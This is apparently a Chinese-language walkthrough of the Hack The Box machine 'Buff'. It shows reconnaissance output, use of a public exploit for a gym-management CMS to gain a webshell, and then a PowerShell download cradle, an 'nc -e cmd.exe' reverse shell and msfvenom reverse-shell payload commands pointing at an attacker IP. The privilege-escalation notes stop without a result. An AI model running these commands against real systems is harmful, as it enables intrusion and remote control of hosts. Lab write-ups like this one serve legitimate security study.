# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 服务探测
```
─(root💀kali)-[~/htb/buff]
└─# nmap -sV -Pn 10.10.10.198 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-01 07:24 EST
Nmap scan report for 10.10.10.198
Host is up (0.42s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE    VERSION
7680/tcp open  pando-pub?
8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 750.50 seconds

```

## 目录爆破
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.10.198:8080/                                                                             

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.198-8080/-_21-12-01_07-29-25.txt

Error Log: /root/dirsearch/logs/errors-21-12-01_07-29-25.log

Target: http://10.10.10.198:8080/

[07:29:30] Starting: 
[07:30:04] 200 -   66B  - /.gitattributes                                               
[07:30:31] 200 -  309B  - /Readme.md                                        
[07:30:31] 200 -  309B  - /README.md
[07:30:31] 200 -  309B  - /ReadMe.md
[07:30:31] 200 -  309B  - /README.MD                                        
[07:30:31] 200 -   18KB - /LICENSE
[07:30:32] 301 -  344B  - /Upload  ->  http://10.10.10.198:8080/Upload/     
[07:30:32] 403 -    1KB - /Trace.axd::$DATA                                 
[07:30:47] 200 -    5KB - /about.php                                        
[07:32:06] 403 -    1KB - /cgi-bin/                                          
[07:32:07] 403 -    1KB - /cgi.pl/                                           
[07:32:08] 400 -  983B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd      
[07:32:11] 200 -    1KB - /cgi-bin/printenv.pl                               
[07:32:16] 200 -    4KB - /contact.php                                       
[07:32:27] 200 -    4KB - /edit.php                                          
[07:32:28] 403 -    1KB - /error/                                                                                
[07:32:32] 200 -    4KB - /feedback.php                                      
[07:32:42] 200 -  143B  - /home.php                                          
[07:32:43] 301 -  341B  - /img  ->  http://10.10.10.198:8080/img/            
[07:32:44] 403 -    1KB - /include/                                          
[07:32:44] 301 -  345B  - /include  ->  http://10.10.10.198:8080/include/    
[07:32:45] 403 -    1KB - /index.php::$DATA                                  
[07:32:47] 200 -    5KB - /index.php                                         
[07:32:47] 200 -    5KB - /index.php/login/
[07:32:47] 200 -    5KB - /index.php.                                        
[07:32:47] 200 -    5KB - /index.pHp                                         
[07:32:53] 200 -   18KB - /license                                                                     
[07:33:22] 301 -  345B  - /profile  ->  http://10.10.10.198:8080/profile/    
[07:33:24] 200 -  309B  - /readme.md                                         
[07:33:26] 200 -  137B  - /register.php                                      
[07:33:29] 403 -    1KB - /server-info                                                                      
[07:33:46] 200 -  209B  - /up.php                                            
[07:33:47] 301 -  344B  - /upload  ->  http://10.10.10.198:8080/upload/      
[07:33:48] 403 -    1KB - /upload/                                           
[07:33:48] 200 -  107B  - /upload.php                                        
[07:33:53] 403 -    1KB - /web.config::$DATA                                 
[07:33:55] 403 -    1KB - /webalizer    
```

爆出了很多文件，一个个查看

readme.md文件
```
gym management system
===================

Gym Management System

This the my gym management system it is made using PHP,CSS,HTML,Jquery,Twitter Bootstrap.
All sql table info can be found in table.sql.


more free projects

click here - https://projectworlds.in


YouTube Demo - https://youtu.be/J_7G_AahgSw


```

说是有一个sql文件，我们浏览器打开
```
──(root💀kali)-[/tmp/mozilla_root0]
└─# cat table.sql 
-- phpMyAdmin SQL Dump
-- version 4.1.6
-- http://www.phpmyadmin.net
--
-- Host: 127.0.0.1
-- Generation Time: May 17, 2014 at 07:29 AM
-- Server version: 5.5.36
-- PHP Version: 5.4.25

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `secure_login`
--

-- --------------------------------------------------------

--
-- Table structure for table `login_attempts`
--

CREATE TABLE IF NOT EXISTS `login_attempts` (
  `user_id` int(11) NOT NULL,
  `time` varchar(30) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data for table `login_attempts`
--

INSERT INTO `login_attempts` (`user_id`, `time`) VALUES
(2, '1394950310'),
(2, '1395431162'),
(2, '1395432481'),
(2, '1395432607'),
(3, '1395432637'),
(2, '1395513130');

-- --------------------------------------------------------

--
-- Table structure for table `members`
--

CREATE TABLE IF NOT EXISTS `members` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(30) NOT NULL,
  `email` varchar(50) NOT NULL,
  `password` char(128) NOT NULL,
  `salt` char(128) NOT NULL,
  `admin` int(11) NOT NULL DEFAULT '0',
  `days` varchar(220) DEFAULT '0',
  `present` varchar(220) DEFAULT '0',
  `absent` varchar(220) DEFAULT '0',
  `pect` varchar(220) DEFAULT '0',
  `pic` int(11) DEFAULT '0',
  `picName` mediumtext,
  `paid` int(11) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=latin1 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `members`
--



/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;

```

可惜没有暴露出密码，不过我们至少知道了表结构和字段


/cgi-bin/printenv.pl暴露了一些配置信息
```
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="C:/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs/gym"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="en-US,en;q=0.5"
HTTP_CONNECTION="close"
HTTP_COOKIE="sec_session_id=je937e2bbb8rk56gfbtpl4ctld"
HTTP_HOST="10.10.10.198:8080"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
MIBDIRS="C:/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="C:/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\shaun\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.10.14.15"
REMOTE_PORT="53838"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="10.10.10.198"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="10.10.10.198"
SERVER_PORT="8080"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6 Server at 10.10.10.198 Port 8080</address>\n"
SERVER_SOFTWARE="Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"
```

找了一圈文件，好像没啥特别可以利用的东西。注意到网站好像是用某个cms做的，用```Projectworlds.in  exploit```做关键词，我们找到了这个cms的[一个攻击脚本](https://www.exploit-db.com/exploits/48506)

拿到初始shell
```
┌──(root💀kali)-[~/htb/buff]
└─# python exp.py http://10.10.10.198:8080/                                                                                                                                                                                                  1 ⨯
            /\
/vvvvvvvvvvvv \--------------------------------------,                                                                                                                                                                                           
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

```

# 提权
这个exp的shell非常难用，我们传两个实用工具到靶机，开一个趁手的shell

> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')"

> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8000/wget.exe','C:\xampp\htdocs\gym\upload\wget.exe')"

靶机运行：
> nc.exe 10.10.14.15 4242 -e cmd.exe

接收到反弹shell：
```
┌──(root💀kali)-[~/htb/buff]
└─# nc -lnvp 4242                                                                                                                                                                                                                          130 ⨯
listening on [any] 4242 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.198] 55993
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\gym\upload> 

```


wget.exe http://10.10.14.15:8000/shell_64.exe -o  ./shell_64.exe


Import-Module .\PowerUp.ps1

C:\xampp\htdocs\gym\upload\winPEAS.bat 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > shell.exe

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4444 -f exe > shell_64.exe